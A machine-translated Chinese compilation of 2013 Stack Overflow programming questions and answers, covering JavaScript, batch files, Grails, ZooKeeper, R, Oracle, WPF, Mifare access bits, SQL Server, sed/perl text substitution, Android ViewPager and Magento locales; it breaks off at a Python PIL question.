在滚动时调用 positionSlides()

```
$(window).scroll(function(){
    positionSlides();
}); 
```

我的问题是`sT >= wp`，当 css 属性 'top' 未设置为`wp`. 它设置为似乎是 else 语句传递的最后一个值，该值略小于`wp`. 但同时，`'border' : '1px solid red'`通过相同的 if 语句正确设置。

为什么在语句的 if 部分中没有设置 'top' 属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T01:02:22.360

第一次使用`wp`它不工作的地方是一个字符串。第二次，当你这样做时，它是一个整数或浮点数`wp-sT`。如果您将第一个版本转换为数值，它将起作用。

```
var wp = parseInt($(this).attr('data-waypoint'),10); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:02:42.837

我的猜测是，不知何故`wp`没有加载预期值——这里没有太多空间让其他任何事情出错。

您确定 wp 正在拉动您期望的价值吗？元素的`data-waypoint`属性是如何设置的——也许这就是罪魁祸首？

如果没有，您能否给我们提供示例值，说明您希望设置 top 的值以及实际设置的值？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T23:02:43.327

你的问题是你在每一个滚动事件上都触发了这个。这是很多。在 HTML5Rocks.com 上查看[这篇文章。](http://www.html5rocks.com/en/tutorials/speed/parallax/)它基本上建议`requestAnimationFrame()`每次都使用和检查位置，而不是在滚动事件上进行。

在您的情况下，您可以将代码更改为

```
requestAnimationFrame(positionSlides); 
```

# file - 根据文件名解析文件夹移动文件

> ID：14348403
> 
> 赞同：0
> 
> 时间：2013-01-15T22:50:25.613
> 
> 标签：file, parsing, batch-file, dos

我正在尝试创建一个批处理文件。

它应该让指定源和目标文件夹。将解析源文件夹，并根据文件名的一部分将文件移动到目标文件夹。源文件夹中会有多个文件需要解析。

这些文件将类似于`file-1-tmp.txt, file-2-tmp.txt, file-3-tmp.txt etc.` 我使用 FOR /F 命令使用令牌和分隔符查看的内容 - 但无法让它追索文件夹中的所有文件

如果文件有-1-，它将被移动到目标如果文件有-2-，它将被移动到另一个目标。

ps：在我把头发都弄掉之前请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:06:36.497

您可以只执行多个命令，每种类型的文件一个吗？：

```
for %%i in (*-1-*.*) do move "%%i" dir1\.
for %%i in (*-2-*.*) do move "%%i" dir2\.
for %%i in (*-3-*.*) do move "%%i" dir3\.
...etc... 
```

**更新**

根据@Andriy M 的建议，一种更简单的方法是：

```
for %%n in (1 2 3 <...etc...>) do move *-%%n-*.* dir%%n\. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-18T16:01:16.173

对于这个问题可能有多种方法。

例如，您可以对需要移动到同一目的地的每组文件使用单独的命令，例如在[@Loadmaster 的答案](https://stackoverflow.com/a/14349287/297408)中。

一种完全不同的方法是遍历所有文件，在进行时确定每个文件的目的地。这种方法的实现可能如下所示：

```
@ECHO OFF
FOR %%I IN ("D:\path\to\source\file-*-tmp.txt") DO (
  FOR /F "tokens=2 delims=-" %%C IN ("%%C") DO (
    IF %%C == 1 (
      MOVE %%I D:\path\to\destination\1
    ) ELSE IF %%C == 2 (
      MOVE %%I D:\path\to\destination\2
    ) ELSE IF ...
    ...
  )
) 
```

也就是说，您迭代存储在特定文件夹中的文件并使用简单`FOR`循环匹配特定掩码。在循环体中，您使用另一个循环，即`FOR /F`one 来拆分名称并到达确定目标的部分。获得该部分后，您可以使用一组嵌套`IF`命令将其单独与所有可能的值进行比较，并为每个匹配项指定一个`MOVE`命令以相应地放置文件。

您还可以修改上述脚本，以便更方便地指定目标路径。特别是，您可以在脚本的开头准备一组包含所有可能目标路径的变量。在内部循环的主体中，`IF`您将只使用一个来确定与提取的部分对应的“目标变量”是否存在，而不是多个 s。如果是这样，您只需使用存储在该变量中的路径将文件移动到。以下是这种变体的实现方式：

```
@ECHO OFF
SETLOCAL
SET "dest1=D:\path\to\destination\1"
SET "dest2=D:\path\to\destination\2"
...
FOR %%I IN ("D:\path\to\source\file-*-tmp.txt") DO (
  FOR /F "tokens=2 delims=-" %%C IN ("%%C") DO (
    SETLOCAL EnableDelayedExpansion
    IF DEFINED dest%%C MOVE %%I !dest%%C!
    ENDLOCAL
  )
) 
```

# grails - 从控制器传递我的“自己的”地图并 将其呈现在视图中

> ID：14348406
> 
> 赞同：0
> 
> 时间：2013-01-15T22:50:28.983
> 
> 标签：grails, grails-orm, grails-plugin, gsp, grails-controller

所以这是我的控制器中的 show() 方法，其中 InsitutionList 作为全局变量，但是当我想从 list.gsp 访问这个 InsitutionList 时，它没有呈现（也没有给出任何错误，如空值，从那里我相信我正在传递它成功）任何东西。还提到了下面的 gsp 片段。

```
def show(Long id){
    def tacticalIndustryCodeInstance = TacticalIndustryCode.get(id);
    def query = Institution.where { idParam ->
        idInstitution == idParam    
    }   
    def institution = query.find(id)
    if(!institution){
        flash.message = message(code: 'default.not.found.message', args: [message(code: 'institution.label', default: 'Institution'), id])
        redirect(action: "list")
        return
    }

    institutionList.putAt(institution.getLongName(), tacticalIndustryCodeInstance)

    if(!tacticalIndustryCodeInstance){
        flash.message = message(code: 'default.not.found.message', args: [message(code: 'tacticalIndustryCode.label', default: 'TacticalIndustryCode'), id])        
        redirect(action: "list")
        return 
    }       
    [tacticalIndustryCodeInstance: tacticalIndustryCodeInstance, institutionList: institutionList]

} 
```

尝试了不同的东西，没有运气：

1)

```
 <td><g:link action="show" id="${tacticalIndustryCodeInstance.id}">${fieldValue(bean: tacticalIndustryCodeInstance, field: "id")}</g:link></td>

                    <td>${fieldValue(bean: tacticalIndustryCodeInstance, field: "industrySector")}</td>

                    <td>${Institution.executeQuery("Select longName from Institution where idInstitution = :id?",[id : $(fieldValue(bean: tacticalIndustryCodeInstance, field: "id"))])}</td>   
                </tr>
            </g:each> 
```

2）像这样更简单也不起作用

```
 <g:each in="${institutionList}" var="institutionListInstance">
                <td>${fieldValue(bean: institutionList, field: "longName")}</td>
            </g:each> 
```

3)

```
<table id="tacticalIndustryCodeTable" class="center">
<thead>
                    <tr>                    
                        <g:sortableColumn property="id" title="${message(code: 'tacticalIndustryCode.id.label', default: 'Institution Id')}" />

                        <g:sortableColumn property="industrySector" title="${message(code: 'tacticalIndustryCode.industrySector.label', default: 'industrySector')}" />

                        <g:sortableColumn property="longName" title="${message(code: 'institution.longName.label', default: 'longName')}" />

                    </tr>
                </thead>
                <tbody>
                <g:each in="${institutionList}" var="institutionListInstance">
                    <td>${institutionListInstance.key}</td>
                    <g:each in="${institutionListInstance.value}" var="item">
                        <td>${item.id}</td>
                        <td>${item.industrysector}</td>
                </g:each>
                </tbody>
            </table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:59:47.110

看来您正在更改错误的操作或 gsp。只要您没有在“show”操作中指定视图，Grails 就会呈现 show.gsp，但您希望 list.gsp 上有“institutionList”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T00:47:16.690

似乎那`institutionList`不是`Map`一个`List`

```
institutionList.putAt(institution.getLongName(), tacticalIndustryCodeInstance) 
```

好像

```
Map.putAt(Object key, Object value) 
```

什么显示带有以下代码的 gsp？

```
<g:each in="${institutionList}" var="institutionListInstance">
    <td>${institutionListInstance}</td>
</g:each> 
```

还是使用 gsp 中最简单的代码？

```
<h1>${institutionList}</h1> 
```

# apache-zookeeper - ZooKeeper 集成集群中的最大服务器数？

> ID：14348409
> 
> 赞同：4
> 
> 时间：2013-01-15T22:50:54.057
> 
> 标签：apache-zookeeper

用例：一个池中有 100 台服务器；我想在每个服务器上启动 ZooKeeper 服务，并且服务器应用程序（ZooKeeper 客户端）将使用 ZooKeeper 集群（读/写）。那么就没有单点故障。

对于这个用例，这个解决方案是否可行？性能怎么样？

如果池中有 1000 台服务器怎么办？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-16T01:04:06.500

如果您只是想避免*单*点故障，那么您只需要 3 台服务器。在 3 个节点的集合中，可以容忍单个故障，其余 2 个节点构成仲裁。您拥有的服务器越多，写入性能就越差。而 100**台服务器**就是这个极限，如果 ZK 甚至可以处理的话。

但是，拥有这么多**客户**完全没有问题。Zookeeper 拥有超过 1000 个*客户端*的活跃部署。如果您发现需要更多服务器来处理读取负载，您可以随时添加[Observers](http://zookeeper.apache.org/doc/trunk/zookeeperObservers.html)。我强烈建议您加入[列表服务](http://zookeeper.apache.org/lists.html)。这是快速回答您的问题的好方法，而且可能比任何人在 SO 上给您的详细得多。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-01T09:20:06.397

也许动物园管理员不是正确的工具？

[Hazelcast](http://www.hazelcast.com/)做你想做的事，我想。您可以有数百个对等点，如果主节点丢失，则从所有对等点中选出一个新的。

你不需要使用所有的榛子石膏。您可以只使用映射，或者只使用工作池，或者只使用同步原语，或者只使用消息传递等。

# r - 在 R 中设置行长

> ID：14348418
> 
> 赞同：2
> 
> 时间：2013-01-15T22:51:42.537
> 
> 标签：r, stata

[Google R 风格](http://google-styleguide.googlecode.com/svn/trunk/google-r-style.html#linelength)指南建议行长最多为 80 个字符。我想知道如何在`R`. 这样`stata`做如下：

```
set linesize 80 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T22:53:51.513

是：

```
options()$width 
```

你想要什么？

你可以这样设置：

```
options(width=80) 
```

# oracle - 需要查询以有条件地显示列

> ID：14348420
> 
> 赞同：1
> 
> 时间：2013-01-15T22:51:57.390
> 
> 标签：oracle

比如前端可以给出一个Date，那么就加上Date='someDate' 和必要的`AND`关键字，同样用 显示`Date`列`SELECT`。否则，该日期列既不会显示在条件字符串中，也不会显示在`SELECT`

就像日期不为空一样

```
Select .... Date as Date01 from TableName where ....AND Date01='someDate'; 
```

如果日期为空，则

```
Select .... from TableName where ..; 
```

如何实现这样的目标？谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:55:18.340

如果要返回两个单独的选择列表，则需要两个查询来执行此操作。

您不能`SELECT`根据是否提供日期来隐藏列表中的列。

如果要包含列和条件，则可以使用`case`表达式为没有条件的记录提供不同的值。与此类似：

```
select 
   case when Date01='someDate' 
        then Date 
        else null end as Date01
from TableName
where yourFilters
  or Date01='someDate' 
```

# xaml - ListView set Column datatemplate(celltemplateselector) 取决于来自另一列的数据

> ID：14348424
> 
> 赞同：1
> 
> 时间：2013-01-15T22:52:17.727
> 
> 标签：xaml, listview, datatemplateselector

我有一个 ListView，您可以在下面的代码中看到：

```
<ListView Grid.Row="2" MinHeight="75" x:Name="_lstvSearch" ItemsSource="{Binding Search.SearchExpressions}">
            <ListView.View>
                <GridView>
                    <GridViewColumn Header="Field name">
                        <GridViewColumn.CellTemplate>
                            <DataTemplate>
                                <ComboBox IsEditable="True" ItemsSource="{Binding DataContext.Fields, 
                                   RelativeSource={RelativeSource Mode=FindAncestor, AncestorType={x:Type ListView}}}"
                                          SelectedItem="{Binding Field, Mode=TwoWay}"
                                          DisplayMemberPath="Field.UserFriendlyFieldName"/>
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>
                    </GridViewColumn>
                    <GridViewColumn Header="Operator">
                        <GridViewColumn.CellTemplate>
                            <DataTemplate>
                                <ComboBox IsEditable="True" ItemsSource="{Binding Field.Operators}"
                                          SelectedItem="{Binding Operator, Mode=TwoWay}"
                                          DisplayMemberPath="Operator"/>
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>
                    </GridViewColumn>
                    <GridViewColumn Header="Value">
                        <GridViewColumn.CellTemplateSelector>
                            <vm:FieldValueTemplateSelector>
                                <vm:FieldValueTemplateSelector.Alpha>
                                    <DataTemplate>
                                        <TextBox Text="{Binding Value}"/>
                                    </DataTemplate>
                                </vm:FieldValueTemplateSelector.Alpha>
                                <vm:FieldValueTemplateSelector.Numeric>
                                    <DataTemplate>
                                        <igEditors:XamNumericEditor Value="{Binding Value}" />
                                    </DataTemplate>
                                </vm:FieldValueTemplateSelector.Numeric>
                                <vm:FieldValueTemplateSelector.CheckBox>
                                    <DataTemplate>
                                        <CheckBox IsChecked="{Binding Value}"/>
                                    </DataTemplate>
                                </vm:FieldValueTemplateSelector.CheckBox>
                                <vm:FieldValueTemplateSelector.DateTime>
                                    <DataTemplate>
                                        <igEditors:XamDateTimeEditor Value="{Binding Value}" />
                                    </DataTemplate>
                                </vm:FieldValueTemplateSelector.DateTime>
                                <vm:FieldValueTemplateSelector.DropDownItem>
                                    <DataTemplate>
                                        <ComboBox ItemsSource="{Binding Value}"/>
                                    </DataTemplate>
                                </vm:FieldValueTemplateSelector.DropDownItem>
                                <vm:FieldValueTemplateSelector.Generic>
                                    <DataTemplate>
                                        <TextBox Text="{Binding Value}"/>
                                    </DataTemplate>
                                </vm:FieldValueTemplateSelector.Generic>
                            </vm:FieldValueTemplateSelector>
                        </GridViewColumn.CellTemplateSelector>
                    </GridViewColumn>
                    <GridViewColumn Header="AND/OR">
                        <GridViewColumn.CellTemplate>
                            <DataTemplate>
                                <ComboBox IsEditable="True" ItemsSource="{Binding DataContext.ConditionLinks, 
                                    RelativeSource={RelativeSource Mode=FindAncestor, AncestorType={x:Type ListView}}}"
                                          SelectedItem="{Binding BooleanOperator, Mode=TwoWay}"/>
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>
                    </GridViewColumn>
                    <GridViewColumn Header="Remove">
                        <GridViewColumn.CellTemplate>
                            <DataTemplate>
                                <Button Content="Remove" IsEnabled="{Binding IsValid}" Tag="{Binding}" Click="Button_Click"/>
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>
                    </GridViewColumn>
                </GridView>
            </ListView.View>
        </ListView> 
```

我的问题是我不想根据从第一列**字段名称中的选择来更改****值**列中的 CellTemplate，但是我该如何触发它。

 **选择字段后，我的模型 cald FieldDatatype 中有一个属性，我从中确定第一列中选​​择的字段的类型。正如您在**Value**列中看到的那样，我设置了一个 CellTemplateSelector(FieldValueTemplateSelector) ，但是这个设置只有一次数据模板，并且当我从第一列中选​​择其他字段时不会刷新。**

# android - 每个 Mifare Classic 的位访问条件

> ID：14348430
> 
> 赞同：0
> 
> 时间：2013-01-15T22:52:31.727
> 
> 标签：android, nfc, mifare

我正在使用标签 Mifare Classic 1k。我能够读取大部分数据，但现在我想了解每个扇区第三块中访问条件的位。我已阅读此网站上的官方文档：[http](http://www.nxp.com/documents/data_sheet/MF1S50YYX.pdf) ://www.nxp.com/documents/data_sheet/MF1S50YYX.pdf ，但我不明白如何解释与键 a 和 B 相关的位。有人可以帮忙我明白了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T14:48:01.110

NXP 有一个（非常）旧的 MIFARE 阅读器程序，名为“MifareWnd”，可从[http://www.nxp.com/documents/software/PE089917.zip](http://www.nxp.com/documents/software/PE089917.zip)获得。它还可用于对访问控制位进行编码和解码。

说明：下载它，安装它并启动它。在带有“块”标签的文本输入字段中输入扇区尾部的地址（例如“3”），这将启用“编辑 AC”按钮。如果要解码设置，请在带有“HEX”标签的文本字段中以十六进制输入扇区尾标的内容。点击“Edit AC”查看解码后的内容。您还可以编辑设置并获取编码值。

# sql - 可以在同一个存储过程中使用临时表和表变量吗？

> ID：14348431
> 
> 赞同：0
> 
> 时间：2013-01-15T22:52:37.157
> 
> 标签：sql, sql-server, sql-server-2008

我的存储过程中有一个选择返回 4000 + 行。我打算把它做成一个临时表，以便稍后在程序中处理数据。

我还有其他各种只返回 100-300 行的选择。我打算制作这些表变量，以便在稍后的过程中再次工作。

是否可以在同一过程中使用临时表和表变量，或者这会导致任何性能问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T22:56:39.963

是的，没关系。

至于编程实践，如果我正在阅读存储过程，我会更喜欢一种或另一种（并且倾向于表变量）。但是，您可能有充分的理由使用其中一个，例如需要临时表上的索引或将其用于 a `select into`，然后继续。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T08:43:34.713

这是您需要寻找全套选项的[**地方 sommarskog.se - share_data**](http://www.sommarskog.se/share_data.html)

能够向临时表添加各种索引是我有时会选择临时表的一个特别原因。

为了避免连续命中临时数据库，如果不需要索引，那么我将使用表变量。

现在我经常使用很多`CTE`一起工作的 s 并且避免使用任何类型的物化表。

经典答案—— *“视情况而定！”*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T22:56:22.490

我觉得这里有很多我们不知道的因素，比如你们公司的资源，你们的时间限制等等。

一般来说，为此目的使用临时表是可以的。和 100-300 行（在选择中提到） - 那是花生。不用担心。

# bash - 如何使用 sed/awk 查找/替换和增加匹配的数字？

> ID：14348432
> 
> 赞同：50
> 
> 时间：2013-01-15T22:52:38.003
> 
> 标签：bash, sed, awk

直截了当，我想知道如何使用 grep/find/sed/awk 来匹配某个字符串（以数字结尾）并将该数字增加 1。我最接近的是将 1 连接到最后（效果很好），因为要点是简单地更改值。这是我目前正在做的事情：

```
find . -type f | xargs sed -i 's/\(\?cache_version\=[0-9]\+\)/\11/g' 
```

由于我不知道如何增加数字，我捕获了整个内容并添加了一个“1”。之前，我有这样的事情：

```
find . -type f | xargs sed -i 's/\?cache_version\=\([0-9]\+\)/?cache_version=\11/g' 
```

所以至少我明白如何捕捉我需要的东西。

我不会解释这是为了什么，而是解释我想要它做什么。它应该根据当前目录递归地在任何文件中查找文本（不重要，它可以是任何目录，所以我稍后会配置它），匹配“？cache_version =”和一个数字。然后它将增加该数字并在文件中替换它。

目前我上面的东西有效，只是我不能在最后增加找到的数字。能够递增而不是附加“1”会更好，这样未来的值就不会是“11”、“111”、“1111”、“11111”等等。

我已经阅读了数十篇文章/解释，并且经常建议使用`awk`，但我不能终生将它们混合在一起。我最接近 using`awk`的，它实际上并没有取代任何东西，是：

```
grep -Pro '(?<=\?cache_version=)[0-9]+' . | awk -F: '{ print "match is", $2+1 }' 
```

我想知道是否有某种方法可以`sed`在末尾传递 a 并传递原始文件名，以便`sed`可以具有文件名和递增的数字（来自`awk`），或者它需要的任何东西`xargs`。

从技术上讲，这个数字并不重要。这个替换主要是为了确保那里有一个新的数字，100% 肯定与上一个不同。所以当我写这个问题时，我意识到我不妨使用系统时间 - 自纪元以来的秒数（AJAX 经常使用该技术来消除对后续“相同”请求的缓存）。我最终得到了这个，它看起来很完美：

```
CXREPLACETIME=`date +%s`; find . -type f | xargs sed -i "s/\(\?cache_version\=\)[0-9]\+/\1$CXREPLACETIME/g" 
```

（我首先存储该值，以便所有文件都获得相同的值，以防它因任何原因跨越数秒）

但我仍然很想知道关于增加匹配数字的原始问题。我猜一个简单的解决方案是将它变成一个 bash 脚本，但是，我认为有一种比递归循环遍历每个文件并检查其内容是否匹配然后替换更简单的方法，因为它只是增加一个匹配的数字...没有太多其他逻辑。我只是不想写入任何其他文件或类似的东西 - 它应该就地执行，就像`sed`使用“i”选项一样。

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2013-01-15T23:32:48.220

我认为查找文件对您来说不是困难的部分。因此，我直奔主题，进行 +1 计算。如果您有**gnu sed**，可以通过以下方式完成：

```
sed -r 's/(.*)(\?cache_version=)([0-9]+)(.*)/echo "\1\2$((\3+1))\4"/ge' file 
```

举个例子：

```
kent$  cat test 
ello
barbaz?cache_version=3fooooo
bye

kent$  sed -r 's/(.*)(\?cache_version=)([0-9]+)(.*)/echo "\1\2$((\3+1))\4"/ge' test     
ello                                                                             
barbaz?cache_version=4fooooo
bye 
```

如果您愿意，可以添加 -i 选项。

**编辑**

`/e`允许您将匹配的部分传递给外部命令，并用执行结果进行替换。仅限 Gnu sed。

看这个例子：外部命令/工具`echo`，`bc`被使用

```
kent$  echo "result:3*3"|sed -r 's/(result:)(.*)/echo \1$(echo "\2"\|bc)/ge' 
```

给出输出：

```
result:9 
```

您可以使用其他强大的外部命令，如 cut、sed（再次）、awk...

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-01-15T23:16:07.210

此`perl`命令将搜索当前目录中的所有文件（无需遍历它，您将需要`File::Find`模块或类似文件来完成更复杂的任务）并将增加匹配的行数`cache_version=`。它使用`/e`评估替换部分的正则表达式的标志。

```
perl -i.bak -lpe 'BEGIN { sub inc { my ($num) = @_; ++$num } } s/(cache_version=)(\d+)/$1 . (inc($2))/eg' * 
```

我`file`在当前目录中使用以下数据对其进行了测试：

```
hello
cache_version=3
bye 
```

它备份原始文件（`ls -1`）：

```
file
file.bak 
```

`file`现在有了：

```
hello
cache_version=4
bye 
```

我希望它对您正在寻找的东西有用。

* * *

**UPDATE**用于`File::Find`遍历目录。它接受`*`作为参数，但会将它们与找到的参数一起丢弃`File::Find`。开始搜索的目录是脚本执行的当前目录。它在行中被硬编码`find( \&wanted, "." )`。

```
perl -MFile::Find -i.bak -lpe '

    BEGIN { 
        sub inc { 
            my ($num) = @_; 
            ++$num 
        }

        sub wanted {
            if ( -f && ! -l ) {  
                push @ARGV, $File::Find::name;
            }
        }

        @ARGV = ();
        find( \&wanted, "." );
    }

    s/(cache_version=)(\d+)/$1 . (inc($2))/eg

' * 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2015-09-29T10:27:29.960

纯*sed*版本：

此版本不依赖于其他命令或环境变量。它使用显式携带。对于进位，我使用 @ 符号，但如果您愿意，可以使用其他名称。使用输入文件中不存在的内容。首先，它找到`SEARCHSTRING<number>`并附加一个 @ 到它。它重复具有未决进位的递增数字（即，在其后有一个进位符号：）`[0-9]@`如果递增 9，则此递增本身产生一个进位，并且该过程将重复，直到没有更多未决进位为止。最后，已产生但未添加到数字的进位被 1 替换。

```
sed "s/SEARCHSTRING[0-9]*[0-9]/&@/g;:a {s/0@/1/g;s/1@/2/g;s/2@/3/g;s/3@/4/g;s/4@/5/g;s/5@/6/g;s/6@/7/g;s/7@/8/g;s/8@/9/g;s/9@/@0/g;t a};s/@/1/g" numbers.txt 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-01-15T23:26:37.813

这很难看（我有点生疏），但这是使用 sed 的开始：

```
orig="something1" ;
text=`echo $orig | sed "s/\([^0-9]*\)\([0-9]*\)/\1/"` ;
num=`echo $orig | sed "s/\([^0-9]*\)\([0-9]*\)/\2/"` ;
echo $text$(($num + 1)) 
```

使用“something1”的原始文件名 ( `$orig`)，sed 将文本和数字部分拆分为`$text`and `$num`，然后在最后一部分中将它们与递增的数字组合，从而产生`something2`.

只是一个开始，因为它不考虑文件名中带有数字或名称末尾没有数字的情况，但希望有助于您使用 sed 的最初目标。

这实际上可以在 sed 中通过使用缓冲区来简化，我相信（sed 可以递归操作），但我对它的这方面*真的很生疏。*

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-12-17T01:55:42.017

```
perl -pi -e 's/(\?cache_version=)(\d+)/$1.($2+1)/ge' FILE [FILE...] 
```

或完整的解决方案：

```
find . -type f | xargs perl -pi -e 's/(\?cache_version=)(\d+)/$1.($2+1)/ge' 
```

**perl 替换运算符**

*   `/e`修饰符对替换进行评估，就好像它是一个 Perl 语句一样，使用它的返回值作为替换文本。
*   `.`运算符在 Perl 中连接字符串。括号确保算术运算`$2+1`优先于串联。
*   `/g`修饰符将替换应用于行内的所有匹配字符串

**perl 选项**

*   `-p`确保 perl 将在每个文件的每一行上执行命令
*   `-i`确保每个文件都将就地编辑
*   `-e`指定执行的 perl 命令（在本例中为替换操作）

# java - ViewPager中Fragment中的GoogleMap，将所有触摸事件保留在GoogleMap中

> ID：14348434
> 
> 赞同：5
> 
> 时间：2013-01-15T22:52:50.127
> 
> 标签：java, android, google-maps-android-api-2

正如标题所述，我在一个片段内有一个 GoogleMap 控件（API v2），该片段本身就是 ViewPager 中的一个项目。当我在地图上拖动时，如果我的第一个拖动动作是在水平轴上，则 ViewPager 会获取所有拖动事件。如果我在垂直平面上进行第一次拖动动作，则所有后续拖动都将委托给地图控件。我想让 GoogleMap 捕获所有拖动事件。我添加了一些调试，我看到当我点击地图控件并开始在垂直平面上拖动时，甚至没有 onTouch 事件到达 ViewPager，因此 GoogleMap 似乎第一次有机会处理该事件或把它传下来。我在 GoogleMap 类上找不到任何方法或侦听器来告诉它处理所有触摸/移动/拖动事件。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T21:37:23.113

解决方案是创建一个覆盖 canScroll 方法的自定义 ViewPager 并在我的 xml 中使用它。canScroll 方法递归地传递一个子视图树，然后决定是否允许视图处理水平滚动，或者它是否应该由父 ViewPager 捕获

```
public class MyViewPager extends ViewPager {

    public MyViewPager (Context context) {
        super(context);
    }

    public MyViewPager (Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    @Override
    protected boolean canScroll(View v, boolean checkV, int dx, int x, int y) {
        // Not satisfied with this method of checking...
        // working on a more robust solution
        if(v.getClass().getName().equals("maps.j.b")) {
            return true;
        }
        return super.canScroll(v, checkV, dx, x, y);
    }

} 
```

在你的布局中......

```
<com.myproject.view.MyViewPager
    android:id="@+id/pager"
    android:layout_width="fill_parent"
    android:layout_height="0dp"
    android:layout_weight="1" /> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-15T20:37:33.470

我遇到了同样的问题，这个解决方案几乎成功了，所以感谢发布它。

我发现的唯一区别是视图类是 maps.ib，所以我改用它：

```
@Override
protected boolean canScroll(View v, boolean checkV, int dx, int x, int y) {
    if (v.getClass().getName().startsWith("maps.")) {
        return true;
    }
    return super.canScroll(v, checkV, dx, x, y);
} 
```

# r - 为什么“Uniroot”命令会给出不同的结果

> ID：14348438
> 
> 赞同：3
> 
> 时间：2013-01-15T22:53:15.697
> 
> 标签：r

我对 uniroot 命令有疑问。我无法以合乎逻辑的方式提出我的问题，因为我不知道为什么在下面示例的第二种情况下每次结果都不同。在第一种情况下，我的 f 函数的结果总是相同的：

```
library(mvtnorm)
f <- function(y1_upr,y2_upr = -0.05453663,target = 25e-4,df=3) {
    pmvt(upper = c(y1_upr,y2_upr),df = df) - target
}
uniroot(f,c(-10000,10000))$root 
```

但是我不知道为什么当我在同一个函数中添加另一个参数时，结果每次都会改变（见下文）：

```
g <- function(y1_upr,
              y2_upr = -0.05453663,
              y3_upr = -0.06236616,
              target = 25e-4,
              df = 3) {
    pmvt(upper = c(y1_upr,y2_upr,y3_upr),df = df) - target
} 
uniroot(g,c(-10000,10000))$root 
```

您会看到，每次使用 g 函数应用 uniroot 命令时，都会得到不同的结果。有人对此有想法吗？我能找到解决结果的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:19:27.660

该算法可能涉及一些随机性度量以选择起点。尝试：

```
set.seed(1) 
uniroot(g,c(-10000,10000))$root 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T07:56:56.953

@joran 是正确的，因为它的默认`GenzBretz`算法`pmvt`涉及随机元素。有一种替代算法，`TVPACK`它给出了一致的结果，但可能不太普遍适用：

```
replicate(10,pmvt(upper=c(0,-0.05453663,-0.06236616),df=3))
 [1] 0.1145384 0.1145367 0.1145365 0.1145336 0.1145381 0.1145354 0.1145385
 [8] 0.1145369 0.1145384 0.1145385
replicate(10,pmvt(upper=c(0,-0.05453663,-0.06236616),df=3,algorithm=TVPACK()))
 [1] 0.1145364 0.1145364 0.1145364 0.1145364 0.1145364 0.1145364 0.1145364
 [8] 0.1145364 0.1145364 0.1145364 
```

# magento - 如何在 Magento 中创建自定义语言环境？

> ID：14348440
> 
> 赞同：3
> 
> 时间：2013-01-15T22:53:21.647
> 
> 标签：magento, locale

我需要的语言环境不包含在标准的 Magento 语言扩展中，所以我需要创建自己的语言环境。

它将是 es-us - 美国的西班牙语。

我发现这篇文章： http: [//kb.magenting.com/content/14/50/en/translate-magento-interface-magento-localization-tips.html](http://kb.magenting.com/content/14/50/en/translate-magento-interface-magento-localization-tips.html)

它说：

“如果您的语言环境没有本地化包，您可以通过简单地从英语或任何其他翻译复制本地化目录来创建它。”

有人可以告诉我如何从该报价中获得在语言环境下拉列表中使用西班牙语（美国）吗？

非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-05-28T21:08:54.890

我在调查 Mage_Core_Model_Locale_Config 时遇到了这个答案，我能够提出一个根本不需要任何代码更改的解决方案。

Mage_Core_Model_Locale_Config 确实包含硬编码的语言环境列表，但 getAllowedLocales() 方法将其与

```
Mage::getConfig()->getNode(Mage_Core_Model_Locale::XML_PATH_ALLOW_CODES); 
```

在 1.4.2 中，Mage_Core_Model_Locale::XML_PATH_ALLOW_CODES 的值为

```
'global/locale/allow/codes' 
```

因此，您需要做的就是将以下 xml 添加到您的“全局”标签中的 app/etc/local.xml 中：

```
 <locale>
        <allow>
            <codes>
                <en_IE/>
              </codes>
        </allow>
    </locale> 
```

并且英语（爱尔兰）语言环境将出现在您的语言环境下拉列表中。唯一的限制是语言环境代码必须是 Zend 框架文档中定义的代码之一：http: [//framework.zend.com/manual/1.12/en/zend.locale.appendix.html](http://framework.zend.com/manual/1.12/en/zend.locale.appendix.html)

'es_US' 是这些受支持的代码之一。我希望这对某人有所帮助。

_佩斯

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T00:03:29.573

不幸的是，看起来语言环境名称好像是硬编码在`Mage_Core_Model_Locale_Config`. 不仅如此，安装过程中还会在数据库中安装语言代码。

我建议不要重写该类来定义您自己的自定义语言，而是在另一个语言环境中“搭载”并将他们的代码用于您的自定义语言包。例如，在 app/locale 中，您可以放置​​文件夹`gl_ES`，复制西班牙语语言包，然后对该语言进行所需的修改。然后在下拉菜单（系统 > 配置 > 常规 > 语言环境）中为您的商店的区域设置，您可以选择`Galician (Galician)`

我认为您请求的自定义解决方案将涉及重写`Mage_Core_Model_Locale_Config`以将您的新语言环境添加到 $_allowedLocales 变量。我认为您可能需要将语言添加到`core_language`表中，但看起来该表已被弃用。

# python - 如何在模板中显示 PIL Image 对象？

> ID：14348442
> 
> 赞同：21
> 
